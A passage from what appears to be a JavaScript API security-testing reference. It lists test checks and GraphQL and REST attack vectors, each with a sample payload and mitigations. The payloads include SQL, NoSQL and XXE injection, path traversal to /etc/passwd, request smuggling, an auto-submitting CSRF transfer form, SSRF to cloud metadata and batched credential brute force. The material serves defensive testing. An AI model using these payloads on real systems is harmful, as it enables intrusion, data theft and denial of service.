  { category: "Business Logic", check: "Test price manipulation in requests", method: "POST", payload: "{\"item\":\"product\",\"price\":0.01}", expected: "Server-side price validation" },
  { category: "Business Logic", check: "Test quantity manipulation", method: "POST", payload: "{\"item\":\"product\",\"quantity\":-1}", expected: "Rejected or validated" },
  { category: "Business Logic", check: "Test discount/coupon stacking", method: "POST", payload: "Apply multiple exclusive coupons", expected: "Only one applied" },
  { category: "Business Logic", check: "Test skipping workflow steps", method: "POST", payload: "Submit payment without checkout", expected: "400, flow enforced" },
  { category: "Business Logic", check: "Test race condition in balance deduction", method: "POST", payload: "Concurrent transfers > balance", expected: "No negative balance" },
  { category: "Business Logic", check: "Test idempotency of payment endpoints", method: "POST", payload: "Same payment request twice", expected: "Charged only once" },
  { category: "Business Logic", check: "Test currency rounding exploitation", method: "POST", payload: "{\"amount\":0.001,\"currency\":\"USD\"} x 10000", expected: "No profit from rounding" },
  { category: "Business Logic", check: "Test timezone manipulation", method: "POST", payload: "Expiry check with different timezone", expected: "Consistent behavior" },
  { category: "Business Logic", check: "Test zero-amount transaction", method: "POST", payload: "{\"amount\":0}", expected: "Rejected or handled" },
  { category: "Business Logic", check: "Test referral self-referral", method: "POST", payload: "Apply own referral code", expected: "Rejected" },

  // ── Error Handling Checks ──

  { category: "Error Handling", check: "Test 404 response for non-existent endpoint", method: "GET", payload: "/api/v1/nonexistent", expected: "404 with generic message" },
  { category: "Error Handling", check: "Test 405 for unsupported method", method: "DELETE", payload: "DELETE on GET-only endpoint", expected: "405 Method Not Allowed" },
  { category: "Error Handling", check: "Test 415 for unsupported media type", method: "POST", payload: "Content-Type: application/octet-stream", expected: "415 Unsupported" },
  { category: "Error Handling", check: "Test malformed JSON handling", method: "POST", payload: "{invalid json content}", expected: "400 without stack trace" },
  { category: "Error Handling", check: "Test empty request body", method: "POST", payload: "(empty body)", expected: "400 with clear message" },
  { category: "Error Handling", check: "Test very large request body", method: "POST", payload: "Body > configured max size", expected: "413 Payload Too Large" },
  { category: "Error Handling", check: "Test missing required fields", method: "POST", payload: "{} (empty object)", expected: "400 with field errors" },
  { category: "Error Handling", check: "Test wrong data types in fields", method: "POST", payload: "{\"age\":\"not_a_number\"}", expected: "400 type validation error" },

  // ── API Versioning & Documentation Checks ──

  { category: "API Management", check: "Test deprecated endpoint access", method: "GET", payload: "/api/v1/ (when v3 is current)", expected: "Redirect or sunset header" },
  { category: "API Management", check: "Test API documentation access control", method: "GET", payload: "/swagger.json, /api-docs", expected: "Auth required or 404" },
  { category: "API Management", check: "Test OpenAPI spec exposure", method: "GET", payload: "/openapi.json, /openapi.yaml", expected: "Auth required or 404" },
  { category: "API Management", check: "Test health endpoint information leak", method: "GET", payload: "/health, /status, /ready", expected: "Minimal info only" },
  { category: "API Management", check: "Test metrics endpoint access", method: "GET", payload: "/metrics, /prometheus, /actuator", expected: "Auth required or 404" },

  // ── Webhook & Integration Checks ──

  { category: "Webhooks", check: "Test webhook signature verification", method: "POST", payload: "Webhook without valid signature", expected: "Rejected" },
  { category: "Webhooks", check: "Test webhook SSRF via callback URL", method: "POST", payload: "{\"url\":\"http://127.0.0.1:8080\"}", expected: "Internal URLs blocked" },
  { category: "Webhooks", check: "Test webhook replay attack", method: "POST", payload: "Replay old webhook delivery", expected: "Rejected (timestamp check)" },
  { category: "Webhooks", check: "Test webhook timeout handling", method: "POST", payload: "Slow-responding webhook endpoint", expected: "Timeout and retry" },
  { category: "Webhooks", check: "Test webhook secret rotation", method: "POST", payload: "Old secret after rotation", expected: "Rejected" },

  // ── File Upload Checks ──

  { category: "File Upload", check: "Test file type validation", method: "POST", payload: "Upload .php with .jpg extension", expected: "Rejected by content check" },
  { category: "File Upload", check: "Test file size limit", method: "POST", payload: "Upload file exceeding max size", expected: "413 Payload Too Large" },
  { category: "File Upload", check: "Test malicious file content", method: "POST", payload: "Upload file with embedded script", expected: "Sanitized or rejected" },
  { category: "File Upload", check: "Test path traversal in filename", method: "POST", payload: "filename: ../../etc/cron.d/malicious", expected: "Sanitized filename" },
  { category: "File Upload", check: "Test null byte in filename", method: "POST", payload: "filename: test.php%00.jpg", expected: "Rejected" },
  { category: "File Upload", check: "Test double extension", method: "POST", payload: "filename: test.php.jpg", expected: "Content-type based validation" },
  { category: "File Upload", check: "Test zip bomb upload", method: "POST", payload: "Upload highly compressed zip file", expected: "Detected and rejected" },
  { category: "File Upload", check: "Test SVG with embedded script", method: "POST", payload: "SVG with <script> tag", expected: "Sanitized or rejected" },
];


// ----------------------------------------------------------------------------
// 3. GRAPHQL_ATTACKS -- GraphQL-Specific Attack Vectors
// ----------------------------------------------------------------------------

const GRAPHQL_ATTACKS = [
  {
    name: "Full Introspection Query",
    description: "GraphQL introspection allows querying the entire schema including types, fields, mutations, and subscriptions. In production, this reveals the complete API surface area to attackers.",
    query: "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } }",
    mitigation: "Disable introspection in production. Use allowlists for permitted queries. Implement query depth limiting. Monitor for introspection attempts."
  },
  {
    name: "Field Suggestion Enumeration",
    description: "GraphQL servers often suggest correct field names when a typo is detected. Attackers can use this to enumerate valid fields without introspection by submitting slightly misspelled field names.",
    query: "query { user { passwor emai usernam phon addres } }",
    mitigation: "Disable field suggestions in production. Customize error messages to remove suggestions. Use persisted queries to prevent arbitrary queries."
  },
  {
    name: "Deeply Nested Query DoS",
    description: "Circular references in the schema (e.g., User has Posts, Post has Author) allow deeply nested queries that cause exponential data fetching and resource exhaustion.",
    query: "query { users(first: 100) { posts(first: 100) { author { posts(first: 100) { author { posts(first: 100) { author { name } } } } } } } }",
    mitigation: "Implement query depth limiting (max 7-10 levels). Use query cost analysis with a maximum budget. Set per-field complexity weights. Implement query timeout limits."
  },
  {
    name: "Alias-Based DoS Attack",
    description: "GraphQL aliases allow requesting the same field multiple times under different names in a single query. This can be used to amplify the workload of a single request.",
    query: "query { a1: expensiveField(id: 1) a2: expensiveField(id: 2) a3: expensiveField(id: 3) ... a1000: expensiveField(id: 1000) }",
    mitigation: "Limit the number of aliases per query. Implement query complexity analysis that accounts for aliases. Set a maximum number of fields per query."
  },
  {
    name: "Batch Query Attack",
    description: "Many GraphQL implementations accept arrays of queries in a single HTTP request. Attackers can send thousands of queries in one request to bypass per-request rate limiting.",
    query: "[{\"query\":\"mutation { login(user: \\\"admin\\\", pass: \\\"pass1\\\") { token } }\"}, {\"query\":\"mutation { login(user: \\\"admin\\\", pass: \\\"pass2\\\") { token } }\"}, ... ]",
    mitigation: "Limit the number of queries in a batch (e.g., max 10). Apply rate limiting per operation, not just per HTTP request. Implement per-IP query quotas."
  },
  {
    name: "Fragment-Based Circular Query",
    description: "Fragments that reference each other create circular queries that can crash the server during query validation or execution.",
    query: "query { user { ...FragA } } fragment FragA on User { posts { ...FragB } } fragment FragB on Post { author { ...FragA } }",
    mitigation: "Implement fragment cycle detection in query validation. Limit fragment spread depth. Use query complexity analysis that follows fragments."
  },
  {
    name: "SQL Injection via GraphQL Arguments",
    description: "GraphQL arguments passed to resolvers may be directly interpolated into SQL queries without parameterization, enabling SQL injection through GraphQL input values.",
    query: "query { users(filter: \"name = 'admin' OR '1'='1'\") { id email } }",
    mitigation: "Use parameterized queries in all resolvers. Validate input types strictly. Use an ORM with query parameterization. Never construct SQL from GraphQL arguments."
  },
  {
    name: "NoSQL Injection via GraphQL Input",
    description: "GraphQL resolvers using MongoDB or other NoSQL databases may be vulnerable to operator injection when input objects are passed directly to database queries.",
    query: "mutation { login(input: { email: \"admin@test.com\", password: { \"$gt\": \"\" } }) { token } }",
    mitigation: "Validate input types strictly (reject objects where strings are expected). Sanitize NoSQL operators from input. Use schema validation to enforce scalar types."
  },
  {
    name: "Authorization Bypass via Direct Mutation",
    description: "Mutations that modify resources may not enforce the same authorization checks as queries. Users can directly mutate objects they should only be able to read, or vice versa.",
    query: "mutation { updateUser(id: \"other_user_id\", input: { role: ADMIN }) { id role } }",
    mitigation: "Implement authorization checks in every resolver (both queries and mutations). Use a centralized authorization layer. Follow the principle of least privilege in resolver design."
  },
  {
    name: "Subscription-Based Data Leak",
    description: "GraphQL subscriptions may not enforce authorization per event, allowing users to subscribe to events for resources they do not own and receive real-time updates.",
    query: "subscription { orderUpdated(userId: \"other_user_id\") { id status total shippingAddress } }",
    mitigation: "Enforce authorization on subscription establishment and per event delivery. Filter subscription events based on the authenticated user's permissions."
  },
  {
    name: "Type Confusion Attack",
    description: "Union types and interfaces in GraphQL allow querying different types through inline fragments. If authorization differs between types, attackers can access restricted types through a permissive parent.",
    query: "query { search(term: \"secret\") { ... on PublicDocument { title } ... on InternalDocument { title content classification } ... on FinancialRecord { amount account } } }",
    mitigation: "Implement per-type authorization checks. Ensure inline fragments are authorized for the resolved type. Do not expose internal types through union types accessible to all users."
  },
  {
    name: "Directive Abuse",
    description: "Custom GraphQL directives may provide debug information, skip authorization, or modify query behavior in unintended ways when used by attackers.",
    query: "query { secretData @skip_auth @debug @include_internal { sensitiveField } }",
    mitigation: "Remove debug and internal directives from production. Validate directive usage server-side. Do not implement authorization logic through client-controllable directives."
  },
  {
    name: "Mutation Rate Limiting Bypass",
    description: "Rate limiting applied per HTTP request can be bypassed by batching multiple mutations within a single GraphQL request using aliases or array syntax.",
    query: "mutation { t1: transferMoney(to: \"attacker\", amount: 1) { success } t2: transferMoney(to: \"attacker\", amount: 1) { success } ... t100: transferMoney(to: \"attacker\", amount: 1) { success } }",
    mitigation: "Apply rate limiting per GraphQL operation, not per HTTP request. Count mutations individually regardless of batching. Implement per-field rate limits for sensitive mutations."
  },
  {
    name: "Persisted Query Bypass",
    description: "APIs using persisted/approved queries for security can sometimes be bypassed by sending arbitrary queries alongside or instead of persisted query hashes.",
    query: "POST /graphql -d '{\"query\": \"{ allUsers { password } }\", \"extensions\": {\"persistedQuery\": {\"sha256Hash\": \"known_hash\"}}}'",
    mitigation: "In production, reject all non-persisted queries. Do not fall back to arbitrary query execution when hash lookup fails. Validate that the query matches the persisted hash."
  },
  {
    name: "File Upload via GraphQL Multipart",
    description: "GraphQL file upload (multipart request specification) can be exploited to upload malicious files, perform SSRF through file URLs, or exhaust storage.",
    query: "mutation { uploadFile(file: Upload!) { url } } // with malicious file in multipart body",
    mitigation: "Validate file types and sizes in upload resolvers. Scan uploaded files for malicious content. Store uploads outside the web root. Generate random filenames."
  },
  {
    name: "Variable Injection",
    description: "Improper handling of GraphQL variables can lead to injection when variables are interpolated into dynamic queries or used directly in database operations.",
    query: "query ($filter: String!) { users(filter: $filter) { id } } // variables: {\"filter\": \"1=1 UNION SELECT * FROM admin_users--\"}",
    mitigation: "Use parameterized queries in resolvers. Validate variable types against the schema. Never construct dynamic queries from variable values."
  },
  {
    name: "Schema Extraction via Error Messages",
    description: "Even with introspection disabled, detailed GraphQL error messages can reveal schema information like valid type names, field names, and argument types.",
    query: "query { __typename user { nonExistentField } } // Error reveals valid fields via suggestions",
    mitigation: "Customize error messages in production. Remove field suggestion functionality. Return generic errors without schema details. Log detailed errors server-side only."
  },
  {
    name: "CSRF via GraphQL GET Requests",
    description: "GraphQL endpoints accepting queries via GET parameters are vulnerable to CSRF because the query is in the URL, which browsers will send with cookies on cross-origin requests.",
    query: "GET /graphql?query=mutation{deleteMyAccount{success}} (via <img> tag on attacker site)",
    mitigation: "Reject mutations via GET method. Require POST for all state-changing operations. Implement CSRF tokens. Use SameSite cookie attribute."
  },
  {
    name: "Batched Brute Force via GraphQL",
    description: "Login or verification mutations batched in a single request allow testing hundreds of credentials without triggering per-request rate limits.",
    query: "[{\"query\":\"mutation{login(email:\\\"admin@target.com\\\",password:\\\"pass001\\\"){token}}\"},{\"query\":\"mutation{login(email:\\\"admin@target.com\\\",password:\\\"pass002\\\"){token}}\"},...]",
    mitigation: "Limit batch query size. Apply rate limiting per mutation operation, not per HTTP request. Implement account lockout per failed login mutation regardless of batching."
  },
  {
    name: "Relay Global ID Enumeration",
    description: "The Relay Node interface encodes type and ID in base64 global IDs. Attackers can decode these, enumerate different types, and query arbitrary objects through the node() query.",
    query: "query { node(id: \"VXNlcjox\") { ...on User { email role } } node2: node(id: \"VXNlcjoy\") { ...on User { email role } } }",
    mitigation: "Implement per-type authorization in the node() resolver. Do not rely on ID obscurity for security. Rate limit node queries. Use opaque IDs that cannot be enumerated."
  },
  {
    name: "Connection/Pagination Resource Exhaustion",
    description: "Relay-style connections with unbounded first/last arguments can request millions of records, causing database and memory exhaustion.",
    query: "query { users(first: 999999) { edges { node { id name email orders(first: 999999) { edges { node { total } } } } } } }",
    mitigation: "Enforce maximum values for first/last arguments (e.g., max 100). Include connection sizes in query cost analysis. Implement cursor-based pagination with strict limits."
  },
  {
    name: "GraphQL Injection via Dynamic Schema",
    description: "Applications that build GraphQL schemas dynamically from user input or database content may be vulnerable to schema injection, allowing attackers to add malicious types or resolvers.",
    query: "// If schema is built from DB: INSERT INTO types VALUES ('Backdoor', 'query { exec(cmd: String!): String }'); // Then query: { exec(cmd: \"cat /etc/passwd\") }",
    mitigation: "Never build GraphQL schemas from untrusted input. Use code-first schema definitions. Validate schema sources. Review dynamic schema changes before deployment."
  },
  {
    name: "Websocket Subscription Hijacking",
    description: "GraphQL subscriptions over WebSockets may not re-validate authentication after the initial connection, allowing continued access with expired or revoked tokens.",
    query: "// 1. Connect with valid token, 2. Token expires/is revoked, 3. Subscription continues delivering events",
    mitigation: "Re-validate authentication periodically for long-lived subscriptions. Implement token expiration checks on each event delivery. Close subscriptions when tokens are revoked."
  },
  {
    name: "Custom Scalar Type Abuse",
    description: "Custom scalar types (JSON, DateTime, URL) with weak validation can accept malicious values that cause injection or unexpected behavior in downstream processing.",
    query: "mutation { createEvent(date: \"2024-01-01'; DROP TABLE events;--\", metadata: \"{\\\"__proto__\\\":{\\\"isAdmin\\\":true}}\") { id } }",
    mitigation: "Implement strict validation for all custom scalar types. Use well-tested libraries for date, URL, and JSON parsing. Reject values that do not match expected formats."
  },
  {
    name: "Denial of Service via __typename Explosion",
    description: "Requesting __typename on every field in a deeply nested query forces the server to resolve type information at every level, which in some implementations is computationally expensive.",
    query: "query { users { __typename name posts { __typename title comments { __typename text author { __typename name posts { __typename } } } } } }",
    mitigation: "Include __typename resolution cost in query complexity analysis. Optimize __typename resolution caching. Apply the same depth limits regardless of __typename usage."
  },
  {
    name: "Mutation Side Effect Chain",
    description: "Chaining multiple mutations in a single request can exploit transaction boundaries. If mutations are not properly isolated, partial failures can leave data in an inconsistent state.",
    query: "mutation { step1: deductBalance(amount: 100) { success } step2: addToCart(item: \"expensive\") { id } step3: checkout { orderId } } // If step3 fails, balance is already deducted",
    mitigation: "Implement proper transaction management for mutation chains. Use saga patterns for multi-step mutations. Ensure rollback on partial failures. Limit mutation chain length."
  },
  {
    name: "Enum Value Brute Force",
    description: "GraphQL enum types reveal all valid values through introspection or error messages. Even without introspection, submitting invalid enum values may trigger suggestions revealing valid ones.",
    query: "query { orders(status: INVALID_VALUE) { id } } // Error: 'Did you mean PENDING, SHIPPED, CANCELLED, REFUNDED?'",
    mitigation: "Disable field and value suggestions in production. Do not reveal enum values in error messages. Require introspection authentication to see enum definitions."
  },
  {
    name: "Input Object Prototype Pollution",
    description: "GraphQL input objects processed by JavaScript resolvers may be vulnerable to prototype pollution if properties like __proto__, constructor, or prototype are not filtered.",
    query: "mutation { updateSettings(input: { \"__proto__\": { \"isAdmin\": true } }) { success } }",
    mitigation: "Sanitize input objects before processing. Use Object.create(null) for clean objects. Filter dangerous property names (__proto__, constructor, prototype). Use input validation schemas."
  },
  {
    name: "Schema Stitching/Federation SSRF",
    description: "In schema stitching or Apollo Federation, subgraph URLs configured by administrators or from external sources can be manipulated to point to internal services, enabling SSRF.",
    query: "// Federation config: subgraph { url: 'http://169.254.169.254/latest/meta-data/' } // or dynamic endpoint resolution pointing to internal services",
    mitigation: "Validate and allowlist subgraph URLs. Do not allow dynamic subgraph URL configuration. Use network-level restrictions for subgraph communication. Monitor for unusual subgraph requests."
  },
  {
    name: "GraphQL IDOR via Nested Resolver",
    description: "While the top-level query may enforce authorization, nested resolvers that fetch related data may not re-check permissions, allowing access to related objects across ownership boundaries.",
    query: "query { myOrder(id: \"my_order\") { id payment { id creditCard { number expiry cvv } } vendor { internalNotes profitMargin } } }",
    mitigation: "Implement authorization checks in every resolver, including nested ones. Do not assume parent authorization implies child authorization. Use a centralized authorization layer."
  },
  {
    name: "Interface Implementation Leak",
    description: "When a GraphQL interface is implemented by both public and internal types, querying the interface may return fields from internal implementations that should not be exposed.",
    query: "query { searchNodes(query: \"admin\") { ... on Node { id } ... on InternalUser { id accessLevel systemRole credentials } } }",
    mitigation: "Do not expose internal types through public interfaces. Implement per-type visibility checks. Remove internal implementations from public-facing schemas."
  }
];


// ----------------------------------------------------------------------------
// 4. REST_ATTACKS -- REST-Specific Attack Vectors
// ----------------------------------------------------------------------------

const REST_ATTACKS = [
  {
    name: "HTTP Parameter Pollution",
    description: "Submitting the same parameter multiple times can cause the server to process a different value than what was validated by security middleware, bypassing input validation or authorization.",
    request: "GET /api/v1/transfer?amount=100&to=attacker&amount=1 (first amount validated, second amount processed, or vice versa depending on framework)",
    mitigation: "Use frameworks that reject duplicate parameters. Normalize parameter handling. Validate after parameter merging. Test with duplicate parameter names."
  },
  {
    name: "HTTP Request Smuggling",
    description: "Discrepancies in how front-end proxies and back-end servers parse HTTP requests (Content-Length vs Transfer-Encoding) allow smuggling hidden requests that bypass security controls.",
    request: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
    mitigation: "Normalize HTTP parsing between front-end and back-end. Reject ambiguous requests. Use HTTP/2 end-to-end. Configure proxies to reject requests with both Content-Length and Transfer-Encoding."
  },
  {
    name: "HTTP Response Splitting",
    description: "Injecting CRLF characters into HTTP response headers allows attackers to split the response and inject arbitrary content, enabling XSS, cache poisoning, or redirect attacks.",
    request: "GET /api/v1/redirect?url=http://legit.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>",
    mitigation: "Sanitize CRLF characters from all input used in HTTP headers. Use framework-provided header setting methods. Validate redirect URLs against allowlists."
  },
  {
    name: "REST API Mass Assignment",
    description: "REST APIs using auto-binding (Rails strong parameters bypass, Django form processing, Node.js ORM) map request body properties directly to model attributes, allowing modification of protected fields.",
    request: "PUT /api/v1/users/me -d '{\"name\":\"Test\",\"role\":\"admin\",\"is_superuser\":true,\"balance\":999999}'",
    mitigation: "Use explicit allowlists for bindable attributes. Implement DTOs. Never auto-bind request bodies to database models. Use separate endpoints for privilege changes."
  },
  {
    name: "HTTP Verb Tampering",
    description: "Changing the HTTP method can bypass access controls. Some frameworks treat HEAD like GET but skip authorization. PATCH may bypass PUT restrictions. Non-standard verbs may skip checks entirely.",
    request: "HEAD /api/v1/admin/users (bypasses GET authorization)\nPATCH /api/v1/config (bypasses PUT authorization)\nFOO /api/v1/admin (non-standard verb bypasses method checks)",
    mitigation: "Apply authorization uniformly across all HTTP methods. Reject non-standard HTTP methods. Ensure HEAD requests are authorized the same as GET."
  },
  {
    name: "Content-Type Switching Attack",
    description: "Sending a request with a different Content-Type than expected may bypass input validation. A JSON validator does not check XML, and an XML parser may process XXE that JSON cannot express.",
    request: "POST /api/v1/data -H 'Content-Type: application/xml'\r\n<?xml version=\"1.0\"?>\r\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\r\n<root><name>&xxe;</name></root>",
    mitigation: "Strictly validate Content-Type headers. Only accept expected content types. Apply input validation based on actual content, not just declared type. Disable XML external entity processing."
  },
  {
    name: "Path Traversal in REST URL",
    description: "REST API path parameters representing resource names or file paths may be vulnerable to directory traversal, allowing access to resources outside the intended scope.",
    request: "GET /api/v1/files/..%2f..%2f..%2fetc%2fpasswd\nGET /api/v1/templates/..\\..\\..\\windows\\system32\\config\\sam\nGET /api/v1/docs/....//....//etc/passwd",
    mitigation: "Validate path parameters against allowlists. Canonicalize paths before processing. Use chroot or sandboxed file access. Never construct file paths from user input directly."
  },
  {
    name: "JSONP Endpoint Exploitation",
    description: "JSONP endpoints return data wrapped in a user-specified callback function. This enables cross-origin data theft from authenticated endpoints and potential XSS through callback name injection.",
    request: "GET /api/v1/user/profile?callback=evil_function\nGET /api/v1/data?jsonp=document.cookie//\nGET /api/v1/info?callback=<script>alert(1)</script>//",
    mitigation: "Disable JSONP in favor of CORS. If JSONP is required, validate callback names against strict patterns (alphanumeric only). Never include sensitive data in JSONP responses."
  },
  {
    name: "REST API CSRF via Form Submission",
    description: "REST APIs that accept application/x-www-form-urlencoded content type and rely solely on cookies for authentication are vulnerable to CSRF through HTML form submissions.",
    request: "<form method='POST' action='https://api.target.com/api/v1/transfer'>\r\n<input name='to' value='attacker'>\r\n<input name='amount' value='10000'>\r\n</form><script>document.forms[0].submit()</script>",
    mitigation: "Use token-based authentication (Bearer tokens in headers). Implement CSRF tokens. Reject form-urlencoded content type on API endpoints. Use SameSite=Strict cookies."
  },
  {
    name: "Cache Poisoning via Host Header",
    description: "If the API generates URLs or content based on the Host header and responses are cached, an attacker can poison the cache with a malicious Host value affecting all subsequent users.",
    request: "GET /api/v1/config HTTP/1.1\r\nHost: evil.com\r\n(response contains: {\"login_url\":\"https://evil.com/login\", cached for all users})",
    mitigation: "Ignore the Host header for generating URLs. Use a server-side configured base URL. Validate the Host header against expected values. Use Vary: Host in cached responses."
  },
  {
    name: "REST API Subdomain Takeover",
    description: "API subdomains pointing to decommissioned cloud services (S3, Heroku, Azure) can be claimed by attackers, allowing them to serve malicious content on a trusted subdomain.",
    request: "dig api-staging.target.com -> CNAME to defunct-app.herokuapp.com\nAttacker claims defunct-app.herokuapp.com\nNow controls api-staging.target.com content",
    mitigation: "Remove DNS records for decommissioned services. Monitor for dangling DNS records. Verify all CNAME targets are active. Implement subdomain inventory management."
  },
  {
    name: "JWT Claim Injection in REST Headers",
    description: "REST APIs that decode JWT claims and use them in downstream processing without validation may be vulnerable to claim injection. Modifying claims like sub, email, or role can escalate privileges.",
    request: "Authorization: Bearer eyJ...(modified payload: {\"sub\":\"admin\",\"role\":\"superuser\",\"email\":\"admin@target.com\"})...signature",
    mitigation: "Validate JWT signatures before processing claims. Verify claims against the identity provider. Do not use JWT claims as the sole authorization source. Implement claim validation rules."
  },
  {
    name: "REST API Rate Limit Bypass via Header Spoofing",
    description: "Rate limiting based on X-Forwarded-For or X-Real-IP headers can be bypassed by rotating these header values, as the API trusts client-supplied IP addresses.",
    request: "GET /api/v1/data -H 'X-Forwarded-For: 1.2.3.4'\nGET /api/v1/data -H 'X-Forwarded-For: 5.6.7.8'\nGET /api/v1/data -H 'X-Forwarded-For: 9.10.11.12'\n(each request gets a fresh rate limit bucket)",
    mitigation: "Use the connecting IP from the trusted proxy, not client-supplied headers. Configure the API to only trust X-Forwarded-For from known proxies. Implement user-based rate limiting alongside IP-based."
  },
  {
    name: "ETag Manipulation for Cache Abuse",
    description: "Manipulating ETag values in If-None-Match headers can cause cache inconsistencies, serve stale data, or bypass cache validation checks depending on the implementation.",
    request: "GET /api/v1/sensitive-data -H 'If-None-Match: \"*\"'\nGET /api/v1/data -H 'If-None-Match: \"weak-etag\"'\nGET /api/v1/config -H 'If-Match: \"forged-etag\"'",
    mitigation: "Implement proper ETag validation. Use strong ETags for sensitive resources. Do not rely solely on ETags for security checks. Validate ETags server-side against stored values."
  },
  {
    name: "Accept Header Exploitation",
    description: "Manipulating the Accept header can cause the API to return data in formats with different security properties. XML responses may enable XXE, while other formats may expose extra fields.",
    request: "GET /api/v1/users -H 'Accept: application/xml' (may trigger XXE-vulnerable serializer)\nGET /api/v1/data -H 'Accept: text/csv' (may include extra columns)\nGET /api/v1/config -H 'Accept: application/yaml' (may expose sensitive YAML anchors)",
    mitigation: "Return only supported content types. Apply the same security filtering regardless of output format. Disable XML serialization if not needed. Validate Accept headers against supported types."
  },
  {
    name: "Range Header Resource Exhaustion",
    description: "Malicious Range headers can cause the server to perform expensive byte-range calculations, serve overlapping ranges, or consume excessive memory assembling multipart responses.",
    request: "GET /api/v1/large-file -H 'Range: bytes=0-0,1-1,2-2,...,999999-999999'\nGET /api/v1/data -H 'Range: bytes=0-99999999999999'\nGET /api/v1/export -H 'Range: bytes=9999999999-0'",
    mitigation: "Limit the number of ranges in a single request. Reject excessively large range requests. Implement range request size limits. Disable multipart range responses if not needed."
  },
  {
    name: "PATCH Operation Abuse (JSON Patch)",
    description: "JSON Patch (RFC 6902) operations (add, remove, replace, move, copy, test) can be abused to modify unintended fields, remove security controls, or copy sensitive data between fields.",
    request: "PATCH /api/v1/users/me -H 'Content-Type: application/json-patch+json' -d '[{\"op\":\"replace\",\"path\":\"/role\",\"value\":\"admin\"},{\"op\":\"remove\",\"path\":\"/mfa_enabled\"},{\"op\":\"copy\",\"from\":\"/password_hash\",\"path\":\"/public_field\"}]'",
    mitigation: "Validate JSON Patch operations against allowed paths. Implement per-path authorization. Reject operations on sensitive fields. Log all patch operations for audit."
  },
  {
    name: "Link Header Injection for SSRF",
    description: "APIs that process Link headers or follow preload/prefetch hints from responses can be tricked into fetching internal resources through crafted Link header values.",
    request: "GET /api/v1/page -H 'Link: <http://169.254.169.254/latest/meta-data/>; rel=\"preload\"'\nGET /api/v1/resource -H 'Link: <http://internal-api:8080/admin>; rel=\"prefetch\"'",
    mitigation: "Do not process Link headers from client requests for server-side fetching. Validate any URLs in headers against allowlists. Block internal IP ranges in URL processing."
  },
  {
    name: "REST API IDOR via Nested Resources",
    description: "Multi-level nested REST resources (/users/{uid}/orders/{oid}/items/{iid}) may only validate the top-level ID against the authenticated user, allowing access to nested resources across users.",
    request: "GET /api/v1/users/my_id/orders/other_user_order_id\nGET /api/v1/teams/my_team/projects/other_team_project/secrets\nPUT /api/v1/orgs/my_org/members/other_org_admin -d '{\"role\":\"removed\"}'",
    mitigation: "Validate the entire resource hierarchy chain. Ensure nested resources belong to their parent. Implement ownership verification at every level. Use flat resource paths where possible."
  },
  {
    name: "API Gateway Bypass via Direct Backend Access",
    description: "If the backend API server is directly accessible (bypassing the API gateway), attackers can skip rate limiting, authentication, and other gateway-enforced security controls.",
    request: "Instead of: GET https://api-gateway.target.com/v1/data\nDirect: GET http://backend-server:3000/v1/data (no gateway auth check)\nDNS/port scan reveals: backend-api.internal.target.com:8080",
    mitigation: "Ensure backend APIs only accept connections from the API gateway. Use network segmentation. Implement mutual TLS between gateway and backends. Apply authentication at both gateway and backend levels."
  },
  {
    name: "Conditional Request Bypass",
    description: "Conditional headers (If-Modified-Since, If-Unmodified-Since, If-Match) may bypass authorization checks when the server short-circuits to 304 Not Modified without re-checking permissions.",
    request: "GET /api/v1/secret-data -H 'If-Modified-Since: Thu, 01 Jan 2099 00:00:00 GMT'\n(server returns 304 without checking authorization)\nGET /api/v1/data -H 'If-None-Match: \"previously-seen-etag\"'",
    mitigation: "Always perform authorization checks before processing conditional headers. Apply authorization regardless of cache status. Return 403 for unauthorized requests even with valid cache conditions."
  },
  {
    name: "Resource Exhaustion via Slow POST",
    description: "Sending POST request body data very slowly keeps server connections open for extended periods, exhausting the connection pool and causing denial of service to legitimate users.",
    request: "POST /api/v1/upload HTTP/1.1\r\nContent-Length: 1000000\r\n\r\n(send 1 byte every 10 seconds, keeping connection open for ~115 days theoretically)",
    mitigation: "Set minimum data transfer rate requirements. Implement request body read timeouts. Limit the number of concurrent connections per IP. Use async I/O to handle slow clients without blocking."
  },
  {
    name: "API Endpoint Enumeration via Timing",
    description: "Timing differences in API responses for existing vs non-existing endpoints reveal valid endpoint paths. A 404 for a real path may take longer than for a non-existent path due to auth checks.",
    request: "GET /api/v1/users -> 401 (50ms, auth checked = endpoint exists)\nGET /api/v1/xyzzy -> 404 (5ms, immediate = endpoint does not exist)\nGET /api/v1/admin -> 403 (60ms, auth checked + denied = admin exists)",
    mitigation: "Normalize response times across endpoints. Return consistent status codes for non-existent endpoints. Add random delays to prevent timing analysis. Use constant-time comparisons."
  },
  {
    name: "Overlong URI Buffer Overflow",
    description: "Extremely long URIs may cause buffer overflows in the API server, reverse proxy, or WAF, potentially crashing the service or bypassing security checks due to truncation.",
    request: "GET /api/v1/data?param=AAAAAA...(100000+ characters)...AAAA\nGET /api/v1/AAAAAA...(very long path)...AAAA/admin",
    mitigation: "Set maximum URI length limits at the web server and API gateway. Reject requests exceeding length limits early. Test infrastructure components for buffer overflow vulnerabilities."
  },
  {
    name: "Deserialization Attack via REST Body",
    description: "REST APIs accepting serialized objects (Java serialization, Python pickle, .NET BinaryFormatter) in request bodies are vulnerable to remote code execution through crafted payloads.",
    request: "POST /api/v1/import -H 'Content-Type: application/x-java-serialized-object' -d '(serialized gadget chain for RCE)'\nPOST /api/v1/process -H 'Content-Type: application/python-pickle' -d '(pickle RCE payload)'",
    mitigation: "Never deserialize untrusted data using native serialization. Use safe formats (JSON, Protocol Buffers). If deserialization is required, use allowlists for permitted classes. Keep serialization libraries updated."
  },
  {
    name: "Server-Side Template Injection via REST Parameters",
